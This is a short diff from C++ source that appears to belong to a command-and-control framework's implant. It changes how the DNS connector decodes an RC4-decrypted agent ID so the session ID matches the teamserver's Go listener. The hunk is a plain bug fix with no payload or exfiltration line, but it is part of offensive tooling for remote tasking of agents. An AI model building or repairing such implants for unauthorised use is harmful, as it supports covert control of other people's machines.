@@ -396,7 +396,18 @@ BOOL ConnectorDNS::SetConfig(ProfileDNS profile, BYTE* beat, ULONG beatSize)
     // so here we decrypt it with the same key to get clear agent_id.
     EncryptRC4(beatCopy, beatSize, this->encryptKey, 16);
 
-    ULONG agentId = *(ULONG*)(beatCopy + 4);
+    // Interpret agent_id in big-endian order to match the HTTP listener /
+    // Go side (which uses binary.BigEndian.Uint32). This ensures that the
+    // sid we derive here is identical to the agentId string used by the
+    // teamserver, so TsAgentProcessData/TsAgentGetHostedTasks(sid, ...) hit
+    // the same agent entry.
+    ULONG agentId = 0;
+    if (beatSize >= 8) {
+        agentId |= ((ULONG)beatCopy[4] << 24);
+        agentId |= ((ULONG)beatCopy[5] << 16);
+        agentId |= ((ULONG)beatCopy[6] << 8);
+        agentId |= ((ULONG)beatCopy[7] << 0);
+    }
     MemFreeLocal((LPVOID*)&beatCopy, beatSize);
 
     _snprintf(this->sid, sizeof(this->sid), "%08x", agentId);
